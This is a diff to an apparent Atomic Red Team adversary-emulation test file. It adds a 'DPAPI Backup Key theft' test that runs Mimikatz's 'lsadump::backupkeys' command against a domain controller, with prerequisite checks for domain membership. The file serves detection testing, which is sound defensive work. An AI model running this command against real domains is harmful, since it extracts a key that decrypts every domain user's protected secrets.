@@ -197,3 +197,48 @@ atomic_tests:
       Remove-Item -Path ".\ADFS_encryption.pfx"
       Remove-Item -Path ".\ADFS_signing.pfx"
     name: powershell
+- name: DPAPI Backup Key theft
+  auto_generated_guid: bf67848f-f383-4bd9-9c03-9561aa938ed6
+  description: |
+    This module runs Mimikatz in order to retrieve the DPAPI Backup Key stored in Active Directory (https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/).
+  supported_platforms:
+  - windows
+  input_arguments:
+    mimikatz_path:
+      description: Path of the Mimikatz binary
+      type: path
+      default: 'C:\Windows\Temp\mimikatz.exe'
+    target_dc:
+      description: Domain Controller to target
+      type: string
+      default: DC.DOMAIN.CORP
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz binary must exist on disk and at the specified location (#{mimikatz_path}).
+      The computer must be domain-joined and the authenticated user must be part of the Domain Admins group (implicit authentication).
+    prereq_command: |
+      if (Test-Path "#{mimikatz_path}") {
+        Write-Host "OK: Mimikatz executable was found"
+      } else {
+        Write-Host "NOK: Mimikatz executable was not found"
+        exit 1
+      }
+
+      if ((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
+        Write-Host "OK: the computer is joined to the domain"
+      } else {
+        Write-Host "NOK: the computer is not joined to the domain"
+        exit 1
+      }
+
+      # If everything goes well
+      exit 0
+    get_prereq_command: |
+      Write-Host "1. This computer must be manually joined to the targeted domain"
+      Write-Host "2. The binary of Mimikatz must be present on the system (https://github.com/gentilkiwi/mimikatz/releases)"
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      "#{mimikatz_path}" "lsadump::backupkeys /system:#{target_dc}" exit
